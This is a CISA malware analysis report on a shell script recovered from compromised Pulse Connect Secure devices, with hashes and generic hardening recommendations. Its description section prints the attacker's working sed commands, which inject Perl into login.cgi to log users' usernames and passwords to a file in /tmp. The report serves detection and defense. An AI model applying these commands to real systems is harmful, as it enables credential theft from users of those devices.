This file contains a malicious shell script recovered from a compromised Pulse Secure device. This malicious script is designed to modify the Pulse Secure login.cgi script effectively causing it to log a valid user's username and password credentials into a file stored on disk. This analysis is derived from malicious files found on Pulse Connect Secure devices.\nFor a downloadable copy of indicators of compromise, see: MAR-10333243-3.v1.stix.\nSubmitted Files (1)\n45b81360ed62ec817fb63c5522fc3400ce0c73a369ea3b381267c2e24051db2b (malware_unallocated.txt)\n\nFindings\n\n45b81360ed62ec817fb63c5522fc3400ce0c73a369ea3b381267c2e24051db2b\nDetails\n\n\n\nName\nmalware_unallocated.txt\n\n\nSize\n1134 bytes\n\n\nType\nASCII text\n\n\nMD5\n13f5fb033db3022b9d99f2993b562d30\n\n\nSHA1\n7ec0d14ae147ecc17a7903c03bb75bd494c736a2\n\n\nSHA256\n45b81360ed62ec817fb63c5522fc3400ce0c73a369ea3b381267c2e24051db2b\n\n\nSHA512\n7fdaae9f30ede5f30331d7907594699be659dbcc7fe3c5cd489445c612a3a15497188a411afb7bc75d963d1d6ff76783da4aa9b19b0b8ed0dfe2e545577741a9\n\n\nssdeep\n24:r7GvGEOnPmhFQhXdPhs08WrmnPXGEOnPmhqQhXdPhx/XXWrmnP3nPyNnP3nPI:r7fnP6QhNPK04nPwnPVQhNPzvpnP3nPz\n\n\nEntropy\n4.875274\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nDescription\nThis shell script was utilized by the attacker to modify the Pulse Secure system script named login.cgi. The modifications to the application login.cgi are performed using the Linux sed command. These modifications are primarily designed to cause the system application to log a user's password and username credentials to a file when the user logs into a compromised Pulse Secure device. The credentials can then be retrieved by the attacker. These stolen credentials may be utilized as a means to easily access the compromised Pulse Secure device remotely, or to pivot to other systems and networks. The sed commands utilized by this script to modify login.cgi are illustrated below.\n\n\t\t\t--Begin Malicious sed Commands--\n\n\t\t\tsed -n \"/DSWebAuth::saveCredentials($sessid/=\" /home/webserver/htdocs/dana-na/auth/login.cgi | sed -n \"1\"\n\n\t\t\tsed -i ''$row' i\\ \\t\\ \\t\\ \\tmy $realmName = $realmInfo->{name}; my $uf=\"/tmp/dswebserver.statementcounters\";open(*FN,\">>$uf\");print FN \"Realm:$realmName Name:$username Pwd:$password AuthNum:1\\\\n\";close (*FN);' /home/webserver/htdocs/dana-na/auth/login.cgi\n\n\t\t\tsed -n \"/DSWebAuth::saveCredentials($sessid/=\" /home/webserver/htdocs/dana-na/auth/login.cgi\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\tsed -i ''$row' i\\ \\t\\ \\t\\ \\tmy $realmName = $realmInfo->{name}; my $uf=\"/tmp/dswebserver.statementcounters\";open(*FN,\">>$uf\");print FN \"Realm:$realmName Name:$userName2 Pwd:$password2 AuthNum:2\\\\n\";close (*FN);' /home/webserver/htdocs/dana-na/auth/login.cgi\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\tsed -n '/my $uf=/p' /home/webserver/htdocs/dana-na/auth/login.cgi\n\n\t\t\tsed -i '/my $uf=/d' /home/webserver/htdocs/dana-na/auth/login.cgi\n\n\t\t\tsed -n '/my $uf=/p' /home/webserver/htdocs/dana-na/auth/login.cgi\n\n\t\t\t--End Malicious sed Commands--\n\n\t\t\tThe modifications made to the Pulse Secure login.cgi application by these sed commands effectively result in the user's username and paswords being logged to a file named \"/tmp/dswebserver.statementcounters\" when the user logs into a compromised Pulse Secure device.\n\nRecommendations\n\nCISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.\n\nMaintain up-to-date antivirus signatures and engines.\nKeep operating system patches up-to-date.\nDisable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.\nRestrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.\nEnforce a strong password policy and implement regular password changes.\nExercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.\nEnable a personal firewall on agency workstations, configured to deny unsolicited connection requests.\nDisable unnecessary services on agency workstations and servers.\nScan for and remove suspicious e-mail attachments; ensure the scanned attachment is its \"true file type\" (i.e., the extension matches the file header).\nMonitor users' web browsing habits; restrict access to sites with unfavorable content.\nExercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).\nScan all software downloaded from the Internet prior to executing.\nMaintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).\n\nAdditional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Special Publication 800-83, \"Guide to Malware Incident Prevention & Handling for Desktops and Laptops\".\n\nContact Information\n\n\n1-888-282-0870\nCISA Central\u00a0(UNCLASS)\nCISA SIPR (SIPRNET)\nCISA IC (JWICS)\n\nCISA continuously strives to improve its products and services.
